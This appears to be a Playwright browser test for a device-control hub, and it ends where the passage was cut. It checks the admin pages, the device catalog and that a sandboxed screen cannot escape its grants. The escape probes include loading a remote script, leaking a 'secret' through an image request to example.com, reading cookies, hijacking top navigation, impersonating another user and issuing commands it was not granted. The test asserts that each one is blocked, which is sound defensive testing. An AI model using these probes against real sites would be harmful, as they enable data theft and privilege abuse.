"""Real-browser check: set up a hub, add a person, and prove their screen is held to its sandbox and its grants.

Needs Python and Playwright, so it is not part of `deno task test`. The easy way to run it:
    tests/browser/run.sh chromium
    tests/browser/run.sh webkit        # the engine Safari is built on
That starts a fresh hub, reads the code it prints, and runs this file against it.

By hand, against a hub that nobody has claimed yet:
    BROWSER=chromium python3 tests/browser/screen_sandbox.py http://127.0.0.1:8099 <code> [folder for screenshots]
Set CHROME_PATH to use a Chrome that is already installed. Exits 0 when every check passes.
"""
import asyncio, json, os, sys, urllib.request
from playwright.async_api import async_playwright

base, claim = sys.argv[1].rstrip("/"), sys.argv[2]
shots = sys.argv[3] if len(sys.argv) > 3 else None
OWNER_PIN, SAM_PIN = "482915", "739264"
LEVEL = "console/input/1/bus/1/level"
results = []

def check(name, ok, detail=""):
    results.append(bool(ok))
    print(("PASS  " if ok else "FAIL  ") + name + (f"\n      {detail}" if detail and not ok else ""))
    return ok

# Run inside the screen: try every way out, report what happened.
PROBES = """
async () => {
  const out = {};
  const attempt = async (name, fn) => { try { await fn(); out[name] = "ALLOWED"; } catch (e) { out[name] = "blocked"; } };
  const socket = (url) => new Promise((ok, no) => { const w = new WebSocket(url); w.onopen = () => { w.close(); ok(); }; w.onerror = () => no(new Error("refused")); });
  const base = document.baseURI.split("/screens/")[0];
  await attempt("read the hub's log over HTTP", () => fetch(base + "/api/log"));
  await attempt("ask the hub who is signed in", () => fetch(base + "/auth/me"));
  await attempt("use the superuser's tools", () => fetch(base + "/admin/api/all"));
  await attempt("open its own connection to the hub", () => socket(base.replace("http", "ws") + "/ws?screen=one-fader"));
  await attempt("reach the internet", () => fetch("https://example.com", { mode: "no-cors" }));
  await attempt("load a script from the internet", () => new Promise((ok, no) => { const s = document.createElement("script"); s.src = "https://example.com/x.js"; s.onload = ok; s.onerror = () => no(new Error()); document.head.append(s); }));
  await attempt("send data out through an image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error()); i.src = "https://example.com/leak.png?secret=1"; }));
  await attempt("read the page around it", () => parent.document.title);
  await attempt("read the hub page's storage", () => localStorage.getItem("x"));
  await attempt("read the session cookie", () => { if (!document.cookie) throw new Error("nothing"); });
  await attempt("open a popup", () => { const w = window.open("https://example.com"); if (!w) throw new Error(); w.close(); });
  await attempt("send the whole page somewhere else", () => { top.location.href = "https://example.com"; });
  out.origin = self.origin;
  return out;
}
"""

ASK = """([plugin, key, value]) => new Promise((res) => {
  const ref = "probe-" + Math.random();
  addEventListener("message", (e) => { if (e.data.type === "ack" && e.data.ref === ref) res(e.data); });
  parent.postMessage({ type: "set", plugin, key, value, ref }, "*");
  setTimeout(() => res({ timeout: true }), 1500);
})"""

async def choose(frame, canvas_id):
    """Open the list of canvases and choose one, as a person would."""
    await frame.locator("#switchName").click()
    await frame.locator(f'#switchList [data-id="{canvas_id}"]').click()

async def main():
    async with async_playwright() as p:
        engine = os.environ.get("BROWSER", "chromium")
        opts = {"args": ["--no-sandbox"]} if engine == "chromium" else {}
        if engine == "chromium" and os.environ.get("CHROME_PATH"): opts["executable_path"] = os.environ["CHROME_PATH"]
        b = await getattr(p, engine).launch(**opts)
        print(f"browser: {engine} {b.version}")
        # One device pixel to a CSS pixel. A sandboxed screen is drawn by a separate process, and Chromium does
        # not always carry a pretended pixel density into it: after a screenshot, a click meant for a screen
        # could land at half its coordinates. With nothing to carry, there is nothing to get out of step.
        phone = dict(viewport={"width": 390, "height": 844}, has_touch=True, is_mobile=True, device_scale_factor=1)
        errors = []

        # --- The owner sets up the hub ---
        owner_ctx = await b.new_context(**phone)
        owner = await owner_ctx.new_page()
        owner.on("pageerror", lambda e: errors.append(str(e)))
        await owner.goto(base + "/")
        check("a new hub sends everyone to setup", owner.url.endswith("/setup"), owner.url)
        await owner.fill("#code", claim); await owner.fill("#name", "Evan")
        await owner.fill("#secret", OWNER_PIN); await owner.fill("#again", OWNER_PIN)
        if shots: await owner.screenshot(path=f"{shots}/1-setup.png")
        await owner.click("#go"); await owner.wait_for_url("**/admin")
        check("claiming it signs the owner in and lands them where setting up happens", True)
        await owner.wait_for_selector("#setup:not([hidden]) .step")
        todo = await owner.locator("#setup .step:not(.done)").all_inner_texts()
        check("a new owner is shown what is left to do, in order", [t.split("\n")[0] for t in todo] == ["Connect a screen to a device", "Invite your team"], str(todo))
        if shots: await owner.screenshot(path=f"{shots}/1b-first-look.png")

        # --- The admin is six places, each at its own address ---
        async def place(name):
            await owner.locator("#places a", has_text=name).click()
        async def places_shown():
            return await owner.evaluate("() => [...document.querySelectorAll('.place')].filter((p) => !p.hidden).map((p) => p.dataset.place)")
        # A change that hands out power is confirmed once, and that holds for a few minutes.
        async def confirm():
            if await owner.locator("#confirm").count(): await owner.fill("#confirm", OWNER_PIN)
        # Something done from a page: done at once while unlocked, and otherwise asked about once in the dialog.
        async def act():
            await owner.wait_for_timeout(250)
            if await owner.locator("#dlg[open]").count():
                await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("there are six places", await owner.locator("#places a").all_inner_texts() == ["Home", "Devices", "Screens", "Automations", "People", "Settings"])
        check("a new owner starts at Home, which says how the hub is", await places_shown() == [""] and "All systems normal" in await owner.locator("#homeStatus").inner_text(), await owner.locator("#home").inner_text())
        check("Home lists each device and how it is", await owner.locator("#homeDeviceList a.line").count() == 2 and "Connected" in await owner.locator("#homeDeviceList").inner_text(), await owner.locator("#homeDeviceList").inner_text())
        check("with nothing waiting, nothing claims to need you", not await owner.locator("#needs").is_visible())
        await place("Devices")
        check("choosing a place changes the address and shows only that place", owner.url.endswith("/admin/devices") and await places_shown() == ["devices"] and await owner.title() == "Devices | Skillfully", owner.url)
        await owner.locator("#drivers h3 a", has_text="Simulated switch").click()
        check("each device has a page of its own, at its own address", owner.url.endswith("/admin/devices/sim-switch") and await owner.locator("#deviceTop h2").inner_text() == "Simulated switch" and not await owner.locator("#devicesIntro").is_visible(), owner.url)
        page = await owner.locator("#drivers").inner_text()
        check("the page holds everything about the device, in the order the work happens", [page.index(t) for t in ["Settings", "Network access", "Values and actions", "Control", "Used by", "About"]] == sorted(page.index(t) for t in ["Settings", "Network access", "Values and actions", "Control", "Used by", "About"]), page)
        await owner.reload(); await owner.wait_for_selector("#deviceTop h2")
        check("which survives loading the page again", await places_shown() == ["devices"] and await owner.locator("#deviceTop h2").inner_text() == "Simulated switch")
        await owner.go_back(); await owner.wait_for_function("() => document.querySelectorAll('#drivers .item').length === 2")
        check("and the back button goes back", owner.url.endswith("/admin/devices"), owner.url)
        await owner.goto(base + "/admin/devices/no-such-thing"); await owner.wait_for_selector("#drivers .item")
        check("an address for a device that is not there says so and shows the ones that are", await owner.locator("#oneDeviceGone").is_visible() and await owner.locator("#drivers .item").count() == 2)
        # --- What is decided about each device is also a text file, and the Hub place says what the files hold ---
        await place("Settings"); await owner.wait_for_selector("#secConfig:not([hidden]) #configList p")
        told = await owner.locator("#secConfig").inner_text()
        check("the Hub place says where each device's decisions are kept as text", "/config/devices" in told and "Secrets are never written" in told, told)
        check("and that the files say what the hub says, when nobody has edited one", "In sync. No pending changes." in told, told)
        await owner.goto(base + "/admin/people"); await owner.wait_for_selector("#people .item")
        check("an address can be opened directly", await places_shown() == ["people"])
        if shots: await owner.screenshot(path=f"{shots}/1c-people-place.png")
        # On a phone the places are along the bottom, under a thumb. On a wide screen they are down the side.
        size = owner.viewport_size
        bar = await owner.locator("#places").bounding_box()
        check("on a phone the places run along the bottom", bar["width"] > bar["height"] and bar["y"] + bar["height"] >= size["height"] - 1, str(bar))
        await owner.set_viewport_size({"width": 1280, "height": 800})
        bar = await owner.locator("#places").bounding_box(); card = await owner.locator("#secPeople").bounding_box()
        check("on a wide screen they run down the side, clear of the page", bar["height"] > bar["width"] and bar["x"] == 0 and card["x"] >= bar["width"], f"{bar} {card}")
        if shots: await owner.screenshot(path=f"{shots}/1d-wide.png")
        await owner.set_viewport_size(size)

        async def admin(path, body):
            r = await owner_ctx.request.post(base + path, data=json.dumps(body), headers={"content-type": "application/json"})
            return await r.json()
        async def state(plugin):
            return await (await owner_ctx.request.get(f"{base}/api/state?plugin={plugin}")).json()

        # --- The owner adds Sam, through the People page ---
        await owner.goto(base + "/admin/screens")
        # --- A screen reaches nothing until the owner gives it a connection ---
        async def give(screen, *devices):
            item = owner.locator("#screens .item", has=owner.locator("h3", has_text=screen))
            await item.get_by_role("button", name="Choose devices").click()
            for d in devices:
                await owner.locator("#dlgBody label.check", has_text=d).locator("input").check()
            await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
            return item
        await owner.wait_for_selector("#screens .item")
        fader_item = owner.locator("#screens .item", has=owner.locator("h3", has_text="One fader"))
        check("a new hub has given no screen any connection", "No devices" in await fader_item.inner_text(), await fader_item.inner_text())
        await give("One fader", "Simulated board")
        await owner.wait_for_selector("#screens .chip.on:has-text('Simulated board')")
        check("the owner gives One fader the soundboard, with their own PIN", True)
        check("having confirmed once, the page says for how long that holds", await owner.locator("#lockbar").is_visible() and "Unlocked: 5 minutes left" in await owner.locator("#lockbar").inner_text(), await owner.locator("#lockbar").inner_text())

        await place("People")
        await owner.fill("#newName", "Sam"); await owner.click("#add button")
        await owner.get_by_text("Add suggested role: Musician").click()
        await owner.wait_for_selector("#roles h3:has-text('Musician')")
        check("a screen's suggested role can be added in one tap", True)
        sam = owner.locator(".item", has=owner.locator("h3", has_text="Sam"))
        await sam.get_by_role("button", name="Roles").click()
        await owner.locator("#dlgBody label.check", has_text="Musician").locator("input").check()
        check("and the next change is not asked to be confirmed again", await owner.locator("#confirm").count() == 0)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Assign").click()
        check("the People page asks for what the screen's abilities need per person", await owner.locator("#slot_ears").count() == 1)
        await owner.fill("#slot_ears", "1"); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await sam.get_by_role("button", name="Invite").click()
        invite = (await owner.locator("#dlgBody .code").inner_text()).strip()
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("an invitation is shown for Sam", len(invite) == 9, invite)
        if shots: await owner.screenshot(path=f"{shots}/2-people.png", full_page=True)

        # --- Sam joins on another phone ---
        sam_ctx = await b.new_context(**phone)
        pg = await sam_ctx.new_page()
        pg.on("pageerror", lambda e: errors.append(str(e)))
        await pg.goto(base + "/")
        check("someone who is not signed in is sent to sign in", pg.url.endswith("/signin"), pg.url)
        # The sign-in page has finished asking the hub what it needs before anything else is typed in the bar.
        await pg.wait_for_selector("#name")
        await pg.goto(f"{base}/join#{invite}")
        await pg.fill("#secret", SAM_PIN); await pg.fill("#again", SAM_PIN); await pg.click("#go")
        await pg.wait_for_url("**/s/one-fader"); await pg.wait_for_timeout(900)
        check("joining lands Sam on the musician's home screen", True)
        fr = next((f for f in pg.frames if "/screens/one-fader/" in f.url), None)
        if not check("the screen is framed", fr is not None): await b.close(); return
        check("the screen is linked to the hub through the shell", await fr.inner_text("#linkText") == "Connected")

        # The screen says "ready" once. Whichever of the frame's script and the screen's page arrives first, the
        # screen must end up connected. Here the frame's script is held back, and then the screen's page is.
        async def linked_when_late(what, pattern):
            late = await sam_ctx.new_page()
            async def hold(route):
                await asyncio.sleep(1.5)
                await route.continue_()
            await late.route(pattern, hold)
            await late.goto(f"{base}/s/one-fader")
            ok = True
            try:
                await late.frame_locator("#screen").locator("#linkText", has_text="Connected").wait_for(timeout=8000)
            except Exception:
                ok = False
            check(f"the screen connects when {what} arrives late", ok)
            await late.close()
        await linked_when_late("the frame's own script", "**/_hub/shell.js")
        await linked_when_late("the screen's page", "**/screens/one-fader/index.html")
        check("it knows which ear mix is Sam's", "bus 1" in await fr.inner_text("#inputName"), await fr.inner_text("#inputName"))
        await pg.locator("#barWho", has_text="S").wait_for()
        check("the bar shows who is signed in, as initials", await pg.inner_text("#barWho") == "S" and await pg.get_attribute("#barWho", "aria-label") == "Account: Sam")
        tabs = await pg.locator("#barList a").all_text_contents()
        await pg.click("#barWho"); menu = await pg.locator("#barMenu").inner_text(); await pg.click("#barWho")
        check("Sam's screens are the ear mix alone; the account menu has the account and no admin", tabs == ["One fader"] and "Account" in menu and "Sign out" in menu and "Admin" not in menu and await pg.locator("#barAdmin").is_hidden(), f"{tabs} {menu}")

        # Drag the fader. Pointer moves from a mouse reach the page the same way a finger's do, in every engine.
        box = await (await fr.query_selector("#fader")).bounding_box()
        y = box["y"] + box["height"] / 2
        xs = [box["x"] + box["width"] * (0.05 + 0.01 * k) for k in range(70)]
        before = (await state("sim-console"))[LEVEL]
        await pg.mouse.move(xs[0], y); await pg.mouse.down()
        for x in xs[1:]:
            await pg.mouse.move(x, y); await pg.wait_for_timeout(12)
        await pg.mouse.up()
        # What the screen believes the finger chose. A screen's frame can run in its own process, so the last
        # moves may land a moment after the call above returns: give them that moment. The screen ignores the
        # hub's answers for longer than this after a move, so what is read here is still the finger's choice.
        await pg.wait_for_timeout(150)
        chosen = float(await fr.get_attribute("#fader", "aria-valuenow"))
        await pg.wait_for_timeout(900)
        held = (await state("sim-console"))[LEVEL]
        shown = (await fr.inner_text("#db")).replace("\n", "").replace("dB", "")
        # Engines deliver the last few pointer moves of a fast drag differently, so where the drag ends is
        # allowed a little room. What must hold everywhere: the value the screen settled on is the one the
        # board ends up holding. A lost last move, or an old value snapping back, fails here.
        check("a drag moves the fader to about where the finger stopped", chosen != before and abs(chosen - -10) <= 1.5, f"started at {before}, the screen chose {chosen}")
        check("the board ends up holding what the screen chose", held == chosen, f"the screen chose {chosen}, the board holds {held}")
        check("the screen shows what the board holds", float(shown) == held, shown)
        log_text = await fr.inner_text("#log")
        check("the screen's history is filled through the bridge, as Sam's own", "You set the level" in log_text, log_text[:80])
        for _ in range(30):
            if "You moved the level from" in await fr.inner_text("#log"): break
            await pg.wait_for_timeout(100)
        log_text = await fr.inner_text("#log")
        check("a drag is in the history as its first step and where it came to rest, not as every position", "You moved the level from Off to" in log_text and log_text.count("You set the level") == 1, log_text[:300])
        if shots: await pg.screenshot(path=f"{shots}/3-sam.png", full_page=True)

        # --- Now behave badly from inside the screen ---
        got = await fr.evaluate(PROBES)
        check("the screen has no origin of its own", got.pop("origin") == "null")
        for name, outcome in got.items():
            check(f"the screen cannot {name}", outcome == "blocked", outcome)
        await fr.evaluate("""() => { const f = document.createElement("form"); f.action = "https://example.com"; f.method = "post"; document.body.append(f); f.submit(); }""")
        await pg.wait_for_timeout(600)
        check("the screen cannot submit a form to the internet", "/screens/one-fader/" in fr.url and pg.url.endswith("/s/one-fader"), f"{fr.url} | {pg.url}")

        # Ask the hub, through the bridge, for things Sam was not granted.
        ack = await fr.evaluate(ASK, ["sim-switch", "switch/outlet/1/on", True])
        check("Sam's screen cannot flip a switch", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        ack = await fr.evaluate(ASK, ["sim-console", "console/input/1/bus/2/level", 10])
        check("Sam's screen cannot touch someone else's ear mix", ack.get("ok") is False and ack.get("error", {}).get("code") == "not_allowed", json.dumps(ack))
        check("the switch did not move", (await state("sim-switch"))["switch/outlet/1/on"] is False)
        check("the other ear mix did not move", (await state("sim-console"))["console/input/1/bus/2/level"] == -90)
        log = await (await owner_ctx.request.get(base + "/api/log?type=skillfully.command.rejected")).json()
        check("both attempts are in the log under Sam's ID", len(log) == 2 and all(e["via"] == "screen/one-fader" and e["actor"].startswith("p_") for e in log), json.dumps(log)[:200])
        check("a screen cannot say it is someone else", await fr.evaluate("""() => new Promise((res) => {
            addEventListener("message", (e) => { if (e.data.type === "hello") res(false); });
            parent.postMessage({ type: "hello", actor: "p_someoneelse" }, "*");
            setTimeout(() => res(true), 500);
        })"""))

        # --- The owner turns Sam off: the phone is cut off at once ---
        people = (await (await owner_ctx.request.get(base + "/admin/api/all")).json())["people"]
        sam_id = next(x["id"] for x in people if x["name"] == "Sam")
        await admin("/admin/api/person/disabled", {"id": sam_id, "disabled": True})
        await pg.wait_for_url("**/signin", timeout=5000)
        check("turning a person off signs their phone out within seconds", True)
        # WebKit reports a refused attempt to leave the sandbox as a page error. That is the sandbox working.
        unexpected = [e for e in errors if "allow-top-navigation" not in e]
        # --- A screen nobody wrote for a device: Controls, given only the switch ---
        await owner.goto(base + "/admin/screens"); await owner.wait_for_selector("#screens .item")
        await give("Controls", "Simulated switch")
        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1200)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        if check("Controls is framed like any other screen", cf is not None):
            cards = await cf.locator(".card h2").all_text_contents()
            check("it shows the switch it was given, and not the soundboard it was not", cards == ["Simulated switch"], str(cards))
            outlet = cf.locator(".row", has_text="switch/outlet/2/on")
            await outlet.get_by_role("button").click(); await owner.wait_for_timeout(700)
            check("pressing a value it was never written for changes the device", (await state("sim-switch"))["switch/outlet/2/on"] is True)
            check("and the screen shows what the device now holds", await outlet.get_by_role("button").inner_text() == "On")
            if shots: await owner.screenshot(path=f"{shots}/4-controls.png", full_page=True)

        # --- Adding a device nobody wrote a driver for, from the store, without leaving the admin page ---
        lamp_port = os.environ.get("LAMP_PORT", "7007")
        await owner.goto(base + "/admin/devices"); await owner.wait_for_selector("#addDevice:not([hidden])")
        await owner.click("#addDevice")
        check("Add a device opens the catalog, at an address of its own", owner.url.endswith("/admin/devices/add") and await places_shown() == ["devices/add"], owner.url)
        await owner.wait_for_selector("#catCompanion:not([hidden]) #catList .maker")
        # Opened straight at that address (a bookmark, or the page loaded again), it is the same catalog.
        await owner.goto(base + "/admin/devices/add")
        await owner.wait_for_selector("#catCompanion:not([hidden]) #catList .maker")
        check("the catalog can be opened at its own address, not only by pressing the button", await places_shown() == ["devices/add"])
        told = await owner.locator("#catalog").inner_text()
        check("Bitfocus Companion modules are a section of their own, with credit and what running one means", "Bitfocus Companion modules" in told and "published by Bitfocus" in told and "need your approval for network access" in told, told)
        check("the hub knows who signed the store's list, so the page does not warn about it", await owner.locator("#catNote").get_attribute("data-unsigned") == "" and "not signed" not in told, told)
        check("with nothing typed, the section lists makers and how many modules each has", "1 module" in await owner.locator("#catList .maker").first.inner_text(), await owner.locator("#catList").inner_text())
        await owner.locator("#catList .maker").first.click(); await owner.wait_for_selector("#catList .catItem")
        shelf = await owner.locator("#catList").inner_text()
        check("a maker opens to its modules, each saying what it is and how far it has been proven", "Test lamp" in shelf and "Tested in simulation" in shelf and "All makers" in shelf, shelf)
        await owner.fill("#catFind", "no such thing anywhere"); await owner.wait_for_function("() => document.querySelector('#catNote').textContent.includes('No matches. You can still install')")
        check("typing something the store does not have says so, and that a file still works", "install a module from a file" in await owner.locator("#catNote").inner_text())
        await owner.fill("#catFind", "pretend LAMP"); await owner.wait_for_selector("#catList .catItem")
        check("typing finds a module by what it does, whatever the capitals", "Test lamp" in await owner.locator("#catList").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/5a-catalog.png", full_page=True)
        await owner.locator("#catList .catItem", has_text="Test lamp").get_by_role("button", name="Install").click()
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        told = await owner.locator("#pkgRest").inner_text()
        check("choosing shows what it is, its license, and where it was built from", "skillfully-test-lamp 1.0.0" in told and "MIT license" in told and "source code" in told, told)
        check("and what the store lets it do without asking", "Allowed by the store without asking" in told and "requires your approval" in told)
        await owner.fill("#devName", "Stage lamp")
        await owner.locator("#pkgRest label.check", has_text="Controls").locator("input").check()
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/5-add-device.png", full_page=True)
        await owner.click("#dlgOk")
        # Its settings open by themselves, drawn from what the module says it takes.
        await owner.wait_for_selector("#set_host", timeout=15000)
        check("adding ends at the new device's own address", "/admin/devices/companion-skillfully-test-lamp" in owner.url, owner.url)
        check("its settings are on its page, with the module's own labels", "Lamp address" in await owner.locator("#deviceSettings").inner_text() and not await owner.locator("#dlg[open]").count())
        check("and its own defaults", await owner.input_value("#set_port") == "7000")
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        if shots: await owner.screenshot(path=f"{shots}/6-settings.png", full_page=True)
        # The hub asks how things are every few seconds. What is being typed is not drawn over when it does.
        await owner.wait_for_timeout(4500)
        check("what is typed into a device's page stays there while the page keeps itself current", await owner.input_value("#set_host") == "127.0.0.1")
        await owner.locator("#deviceSettings").get_by_role("button", name="Save").click()
        lamp_item = owner.locator("#drivers")
        # The store answered for the address it was given, so it connects and nobody is asked anything.
        await lamp_item.locator("#deviceStatus.ok").wait_for(timeout=15000)
        card = await lamp_item.inner_text()
        check("the page says in plain words that it is connected", "Connected" in card, card)
        check("and where it came from, under what license", "from the store" in card and "MIT license" in card and "Source code" in card, card)
        check("it arrives watched only, and the page says what that means", "Read-only. The hub monitors this device and sends it nothing." in card, card)
        check("and says which screen uses it", "Controls · In use" in await owner.locator("#deviceScreens").inner_text(), card)
        # Try it: the device is seen working before anyone is let near it.
        rows = (await (await owner_ctx.request.get(base + "/admin/api/driver/try?id=companion-skillfully-test-lamp")).json())
        turn_on = next(a["label"] for a in rows["actions"] if a["key"] == "generic/action/on")
        power = next(r["label"] for r in rows["readings"] if r["key"] == "generic/reading/power")
        await owner.wait_for_selector("#tryList .reading")
        tried = await owner.locator("#deviceTry").inner_text()
        check("while it is only watched, its page shows what it reports", power in tried and "Actions are disabled while the device is read-only" in tried, tried)
        check("and its buttons are there, and do nothing yet", await owner.locator("#tryList .action", has_text=turn_on).first.get_by_role("button", name="Run").is_disabled())
        await lamp_item.get_by_role("button", name="Enable control").click(); await act()
        await owner.locator("#deviceControl", has_text="Control enabled. Screens that use this device can change it.").wait_for(timeout=10000)
        check("letting people control it is one tap on its page", True)
        check("a long value a device reports does not make its page wider than the phone", await owner.evaluate("() => document.documentElement.scrollWidth <= innerWidth"), str(await owner.evaluate("() => [document.documentElement.scrollWidth, innerWidth]")))
        do_it = owner.locator("#tryList .action", has_text=turn_on).first.get_by_role("button", name="Run")
        await owner.wait_for_function("() => [...document.querySelectorAll('#tryList .action button')].some((b) => !b.disabled)", timeout=10000)
        await do_it.click(); await act()
        await owner.locator("#tryList .reading", has_text=power).locator("b", has_text="on").wait_for(timeout=15000)
        check("then a button on its page really does it, and the reading beside it moves", True)
        # An action that needs something typed in is done from the device's own page, with no screen.
        level_row = owner.locator("#tryList .action", has_text="Set level").first
        check("an action that asks for something first says so, and can be pressed", "Requires input" in await level_row.inner_text() and await level_row.get_by_role("button", name="Run").is_enabled(), await level_row.inner_text())
        await level_row.get_by_role("button", name="Run").click()
        await owner.locator("#dlg[open] #opt-level").wait_for()
        check("it asks on the page for what the action needs, with the module's note beside it", "Full is 100." in await owner.locator("#dlgBody").inner_text())
        await owner.fill("#opt-level", "30")
        if await owner.locator("#dlg #confirm").count(): await owner.fill("#dlg #confirm", OWNER_PIN)
        await owner.click("#dlgOk")
        await owner.locator("#tryList .reading", has_text="Level").locator("b", has_text="30").wait_for(timeout=15000)
        check("and what was typed reaches the device", True)
        tried = await owner.locator("#tryList").inner_text()
        check("what the module's author put together comes first, under the author's headings", 0 <= tried.find("Levels") < tried.find("Full brightness") < tried.find("Power") < tried.find("Lamp on") < tried.find("Other") < tried.find(turn_on), tried)
        check("and a press that is not one plain action is not offered", "Two things at once" not in tried and "not there" not in tried)
        await owner.locator("#tryList .ready", has_text="Full brightness").get_by_role("button", name="Run").click(); await act()
        await owner.locator("#tryList .reading", has_text="Level").locator("b", has_text="100").wait_for(timeout=15000)
        check("a ready-made button does its action with the options its author chose", True)
        if shots: await owner.screenshot(path=f"{shots}/7a-try-it.png", full_page=True)
        if shots: await lamp_item.scroll_into_view_if_needed(); await owner.screenshot(path=f"{shots}/7-device.png")

        # --- The store publishes a newer version. The hub notices, and updating keeps what was decided ---
        check("a device at the store's version is not offered an update", await lamp_item.get_by_role("button", name="Update to 1.1.0").count() == 0)
        # Straight to this computer, whatever proxy the machine running the test is set up with.
        urllib.request.build_opener(urllib.request.ProxyHandler({})).open(f"http://127.0.0.1:{os.environ.get('STORE_PORT', '7008')}/publish-newer").read()
        await lamp_item.locator(".update").wait_for(timeout=20000)
        check("the page says the store has a newer version", "Update available: version 1.1.0" in await lamp_item.inner_text(), await lamp_item.inner_text())
        await lamp_item.get_by_role("button", name="Update to 1.1.0").click()
        told = await owner.locator("#dlgBody").inner_text()
        check("updating says what stays and what happens", "Name, settings and network permissions are kept" in told and "Tested with hardware" in told and "restarts briefly" in told, told)
        await confirm()
        if shots: await owner.screenshot(path=f"{shots}/7b-update.png", full_page=True)
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await lamp_item.locator(".update").wait_for(state="detached", timeout=20000)
        await lamp_item.locator("#deviceStatus.ok").wait_for(timeout=20000)
        card = await lamp_item.inner_text()
        check("after updating it is the new version, connected, still controlled, still on its screen", "1.1.0" in card and "Connected" in card and "Control enabled. Screens" in card and "Controls · In use" in card, card)

        # --- The same module from a file, which nobody has answered for: it has to ask ---
        await owner.locator("#oneDevice a").click(); await owner.wait_for_selector("#addDevice:not([hidden])")
        check("a device's page leads back to the list, where adding is", owner.url.endswith("/admin/devices") and await owner.locator("#drivers .item").count() == 3, owner.url)
        await owner.click("#addDevice"); await owner.click("#catFile")
        check("nothing can be added before a file is chosen", await owner.locator("#dlgOk").is_disabled())
        await owner.set_input_files("#pkg", os.path.join(os.path.dirname(__file__), "..", "fixtures", "companion", "skillfully-test-lamp-1.0.0.tgz"))
        await owner.wait_for_selector("#pkgRest:not([hidden])")
        facts = await owner.locator("#pkgRest .facts").inner_text()
        check("from a file, it starts with no access to the network", "No network access until you approve" in facts and "Not reviewed" in facts, facts)
        await owner.fill("#devName", "Spare lamp"); await confirm(); await owner.click("#dlgOk")
        await owner.wait_for_selector("#set_host", timeout=15000)
        await owner.fill("#set_host", "127.0.0.1"); await owner.fill("#set_port", lamp_port)
        await owner.locator("#deviceSettings").get_by_role("button", name="Save").click()
        spare = owner.locator("#drivers")
        await spare.locator("#deviceStatus.wait").wait_for(timeout=15000)
        check("a device that needs something says it is waiting for you", "Waiting for permission" in await spare.inner_text(), await spare.inner_text())
        check("and holds nothing until you answer", await owner.locator("#deviceReach .grant").count() == 0)
        # Home is where something waiting on the superuser is seen first.
        await place("Home"); await owner.wait_for_selector("#needs:not([hidden]) .need")
        home = await owner.locator("#home").inner_text() + await owner.locator("#needs").inner_text()
        check("Home says something needs you, and what", "1 item needs attention" in home and f"Spare lamp requests network access: connect to 127.0.0.1:{lamp_port} (this computer)" in home, home)
        check("with the store's advice beside it", "Not recommended by store reviewers" in home, home)
        check("something the store advises against cannot be allowed with one tap", await owner.locator("#needs").get_by_role("button", name="Allow").count() == 0 and await owner.locator("#needs").get_by_role("button", name="Review").count() == 1)
        if shots: await owner.screenshot(path=f"{shots}/6a-home-needs-you.png", full_page=True)
        await owner.locator("#needs a.open").click()
        check("and it leads to the device itself", "/admin/devices/" in owner.url and await owner.locator("#deviceTop h2").inner_text() == "Spare lamp", owner.url)
        spare = owner.locator("#drivers")
        asked = await owner.locator("#deviceReach").inner_text()
        check("the question says what it wants in plain words", f"Connect to 127.0.0.1:{lamp_port} (this computer)" in asked, asked)
        check("and warns when it is not the ordinary case", "only if you know what is listening there" in asked)
        check("and shows what the store's reviewers advise", "Not recommended by store reviewers" in asked and "run on the hub's own computer yourself" in asked, asked)
        box = owner.locator("#deviceReach .askBox")
        check("nothing unusual is ticked for you", not await box.is_checked())
        await box.check()
        if shots: await owner.screenshot(path=f"{shots}/6b-asks.png", full_page=True)
        await owner.wait_for_timeout(4500)
        check("a tick is not drawn over either, while the page keeps itself current", await box.is_checked())
        await owner.locator("#deviceReach").get_by_role("button", name="Allow selected").click(); await act()
        await spare.locator("#deviceStatus.ok").wait_for(timeout=15000)
        check("what was allowed is listed, with a way to take it away", await owner.locator("#deviceReach .grant").count() == 1 and await owner.locator("#deviceReach").get_by_role("button", name="Revoke").count() == 1)
        check("once allowed, it connects", "Connected" in await spare.inner_text())
        # Locking ends the few minutes at once: the next change asks again.
        await owner.click("#lockNow"); await owner.wait_for_selector("#lockbar", state="hidden")
        check("locking hides the unlocked notice", not await owner.locator("#lockbar").is_visible())
        await spare.get_by_role("button", name="Remove").click()
        check("and after locking, a change asks for the PIN again", await owner.locator("#confirm").count() == 1)
        await confirm(); await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_function("() => ![...document.querySelectorAll('#drivers h3')].some((h) => h.textContent === 'Spare lamp')")
        check("a device can be removed from the page", True)

        await owner.goto(base + "/s/controls"); await owner.wait_for_timeout(1500)
        cf = next((f for f in owner.frames if "/screens/controls/" in f.url), None)
        first_rows = await cf.locator(".card", has=cf.locator("h2", has_text="Stage lamp")).locator(".row").all_inner_texts()
        check("Controls shows a device's ready-made buttons before everything else", "Levels: Full brightness" in first_rows[0] and "Power: Lamp on" in " ".join(first_rows[:4]), str(first_rows[:5]))
        on = cf.locator(".row", has_text="generic/action/on")
        await on.get_by_role("button", name="Run").click()
        reading = cf.locator(".row", has_text="generic/reading/power").locator(".value")
        for _ in range(40):
            if (await reading.inner_text()).strip() == "on": break
            await owner.wait_for_timeout(100)
        check("the device added a minute ago can be used from Controls", (await reading.inner_text()).strip() == "on", await reading.inner_text())
        pair_row = cf.locator(".row", has_text="generic/action/pair")
        check("an action whose only option is a note is a plain button", await pair_row.get_by_role("button", name="Run").count() == 1 and await pair_row.get_by_role("button", name="Run…").count() == 0, await pair_row.inner_text())
        level_row = cf.locator(".row", has_text="generic/action/level")
        await level_row.get_by_role("button", name="Run…").click()
